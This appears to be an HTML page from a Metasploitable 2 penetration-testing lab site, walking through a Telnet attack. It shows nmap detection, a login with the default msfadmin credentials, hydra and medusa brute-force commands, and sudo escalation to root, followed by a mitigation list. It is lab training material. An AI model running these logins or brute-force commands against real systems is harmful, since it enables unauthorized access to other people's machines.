@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Telnet — Weak Credential Exploit | Metasploitable 2 Lab</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+
+<nav class="site-nav">
+  <div class="container nav-inner">
+    <a class="nav-brand" href="../index.html">
+      <div class="brand-icon">M2</div>
+      <div class="brand-text"><h1>Metasploitable 2</h1><p>Penetration Testing Lab</p></div>
+    </a>
+    <div class="nav-links">
+      <a class="nav-link" href="../index.html#overview">Overview</a>
+      <a class="nav-link" href="../index.html#scan">Nmap Scan</a>
+      <a class="nav-link" href="../index.html#modules">Modules</a>
+    </div>
+    <a class="nav-btn btn" href="../index.html#modules">All Modules</a>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="breadcrumb">
+    <a href="../index.html">Home</a><span>/</span>
+    <a href="../index.html#modules">Modules</a><span>/</span>
+    <span style="color:var(--text)">Telnet</span>
+  </div>
+</div>
+
+<div class="module-hero">
+  <div class="container">
+    <div class="module-hero-top">
+      <div class="module-title-wrap">
+        <p class="section-label">Port 23/tcp — Telnet Protocol</p>
+        <h2>Telnet — Default Credential Login</h2>
+        <p class="sub-title">Plaintext Login → User Shell → Privilege Escalation to Root</p>
+        <div class="overview-pills">
+          <span class="pill">CVE: <strong>N/A (Misconfiguration)</strong></span>
+          <span class="pill">Port: <strong>23/tcp</strong></span>
+          <span class="pill">Impact: <strong>Unauthorized Remote Access</strong></span>
+          <span class="pill">Tool: <strong>Telnet / Hydra / Medusa</strong></span>
+        </div>
+      </div>
+      <span class="badge badge-high" style="font-size:.85rem;padding:.4rem 1rem">High</span>
+    </div>
+    <div class="overview-box">
+      <div class="overview-box-grid">
+        <div><div class="ov-item-label">Service</div><div class="ov-item-value">Linux telnetd</div></div>
+        <div><div class="ov-item-label">Attack Type</div><div class="ov-item-value">Default Credential Login</div></div>
+        <div><div class="ov-item-label">Transmission</div><div class="ov-item-value" style="color:var(--red)">⚠ Plaintext (Unencrypted)</div></div>
+        <div><div class="ov-item-label">Result</div><div class="ov-item-value" style="color:var(--green)">✓ Root Shell via sudo</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="content-layout">
+    <main class="content-body">
+
+      <div class="step-section" id="service-overview">
+        <div class="step-label"><div class="step-num">01</div><h3>Vulnerability Overview</h3></div>
+        <p>Telnet is a legacy remote terminal protocol that transmits all data — including credentials — in <strong>plain text</strong>. This means any network observer (e.g., on the same subnet) can capture login credentials with a packet sniffer like Wireshark. Metasploitable 2 runs Linux telnetd on port 23 with default credentials.</p>
+        <div class="callout">
+          Even if the password were strong, Telnet would still be dangerous because the session is completely unencrypted. An attacker on the same network can intercept the full session including any commands typed. Always replace Telnet with SSH.
+        </div>
+      </div>
+
+      <div class="step-section" id="enumeration">
+        <div class="step-label"><div class="step-num">02</div><h3>Service Detection</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">nmap</span> <span class="kw">-sV -v -p 23</span> <span class="str">&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Nmap Telnet Service Version Scan</span>
+          </div>
+          <img src="../Telnet/Nmap_Telnet_Service_Scan.png" alt="Telnet Nmap Scan" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="manual-login">
+        <div class="step-label"><div class="step-num">03</div><h3>Manual Login — Default Credentials</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">telnet</span> <span class="str">&lt;target-ip&gt;</span> <span class="num">23</span>
+
+<span class="cmt"># At the login prompt:</span>
+<span class="str">metasploitable login:</span> msfadmin
+<span class="str">Password:</span> msfadmin</pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Telnet Login — Default Credentials</span>
+          </div>
+          <img src="../Telnet/Telnet_login.png" alt="Telnet Login" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="bruteforce">
+        <div class="step-label"><div class="step-num">04</div><h3>Automated Bruteforce</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmt"># Hydra telnet bruteforce</span>
+<span class="cmd">hydra</span> <span class="kw">-l</span> msfadmin <span class="kw">-P</span> <span class="pth">/usr/share/wordlists/rockyou.txt</span> telnet://<span class="str">&lt;target-ip&gt;</span>
+
+<span class="cmt"># Medusa telnet bruteforce</span>
+<span class="cmd">medusa</span> <span class="kw">-h</span> <span class="str">&lt;target-ip&gt;</span> <span class="kw">-u</span> msfadmin <span class="kw">-P</span> <span class="pth">/usr/share/wordlists/rockyou.txt</span> <span class="kw">-M</span> telnet</pre>
+        </div>
+      </div>
+
+      <div class="step-section" id="privesc">
+        <div class="step-label"><div class="step-num">05</div><h3>Privilege Escalation via sudo</h3></div>
+        <p>Once logged in as <code>msfadmin</code>, the account has unrestricted sudo access:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmt"># Check what sudo can do</span>
+<span class="cmd">sudo</span> -l
+<span class="cmt"># Shows: (ALL) ALL — full sudo access</span>
+
+<span class="cmt"># Escalate to root</span>
+<span class="cmd">sudo su</span>
+<span class="cmt"># Password: msfadmin</span>
+
+<span class="cmt"># Verify root access</span>
+<span class="cmd">id</span>
+<span class="cmt"># uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="cmd">whoami</span>
+<span class="cmt"># root</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Telnet — Privilege Escalation to Root via sudo</span>
+          </div>
+          <img src="../Telnet/Telnet_Priv_Esc.png" alt="Telnet Privilege Escalation" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="results">
+        <div class="step-label"><div class="step-num">06</div><h3>Results &amp; Impact</h3></div>
+        <div class="results-box">
+          <h4>Outcome</h4>
+          <ul>
+            <li>Remote user shell obtained via Telnet with default credentials</li>
+            <li>Credentials transmitted in plaintext — capturable via network sniffing</li>
+            <li>Root shell achieved through unrestricted sudo access</li>
+            <li>Full system compromise with persistence options available</li>
+          </ul>
+        </div>
+        <div class="mitigation-box">
+          <h4>Detection &amp; Mitigation (Blue Team)</h4>
+          <ul>
+            <li><strong>Disable Telnet entirely</strong> — it is fundamentally insecure (plaintext)</li>
+            <li>Replace with SSH for all remote access needs</li>
+            <li>Remove or disable default accounts (<code>msfadmin</code>, <code>user</code>, etc.)</li>
+            <li>Restrict sudo usage — limit to only required commands per user</li>
+            <li>Apply firewall rules to block port 23 from external networks</li>
+            <li>Capture Telnet traffic in your IDS/SIEM — any Telnet session should alert</li>
+          </ul>
+        </div>
+      </div>
+
+    </main>
+    <aside class="toc">
+      <div class="toc-title">On This Page</div>
+      <a href="#service-overview">Overview</a>
+      <a href="#enumeration">Detection</a>
+      <a href="#manual-login">Manual Login</a>
+      <a href="#bruteforce">Bruteforce</a>
+      <a href="#privesc">Privilege Escalation</a>
+      <a href="#results">Results</a>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="container footer-inner">
+    <div class="footer-left">← <a href="../index.html#modules" style="color:var(--cyan)">Back to Modules</a></div>
+    <div class="footer-links"><a href="./smtp.html">← SMTP</a><a href="./smb.html">SMB →</a></div>
+  </div>
+</footer>
+<div id="lightbox" class="lightbox-overlay"><button class="lightbox-close">✕</button><img src="" alt="" /></div>
+<script src="../assets/js/app.js"></script>
+</body>
+</html>
